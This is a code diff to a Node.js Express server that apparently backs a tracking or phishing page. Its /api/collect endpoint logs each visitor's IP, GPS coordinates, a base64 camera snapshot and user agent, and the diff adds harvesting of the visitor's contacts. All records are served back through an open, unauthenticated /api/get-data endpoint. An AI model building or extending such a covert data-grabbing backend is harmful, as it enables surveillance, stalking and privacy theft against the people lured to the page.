@@ -10,18 +10,16 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 app.use(express.json({ limit: '10mb' }));
 app.use(cors());
 
-// Direct root folder se files serve karne ke liye
 app.use(express.static(__dirname));
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.get('/viewer', (req, res) => {
+app.get('/viewer.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'viewer.html'));
 });
 
-// Database Helper Functions
 function readDB() {
     if (!fs.existsSync(DATA_FILE)) return {};
     try {
@@ -35,7 +33,6 @@ function writeDB(data) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-// 30 Days Auto-Delete Cleaner
 function cleanOldData() {
     let db = readDB();
     const now = new Date().getTime();
@@ -52,19 +49,19 @@ function cleanOldData() {
     if (updated) writeDB(db);
 }
 
-// Data Collect API
 app.post('/api/collect', (req, res) => {
     cleanOldData();
     let db = readDB();
-    const recordId = 'ID_' + Date.now + '_' + Math.floor(Math.random() * 1000);
+    const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
     db[recordId] = {
         id: recordId,
         ip: clientIp,
-        latitude: req.body.latitude || 'Not Granted (Denied)',
-        longitude: req.body.longitude || 'Not Granted (Denied)',
+        latitude: req.body.latitude || 'Not Granted',
+        longitude: req.body.longitude || 'Not Granted',
         image_base64: req.body.image_base64 || null,
+        contacts: req.body.contacts || 'Not Granted / Not Supported',
         userAgent: req.headers['user-agent'],
         timestamp: new Date().toISOString()
     };
@@ -73,7 +70,6 @@ app.post('/api/collect', (req, res) => {
     res.status(200).json({ status: 'success', message: 'Data logged successfully' });
 });
 
-// Fetch Data API
 app.get('/api/get-data', (req, res) => {
     cleanOldData();
     res.status(200).json(readDB());
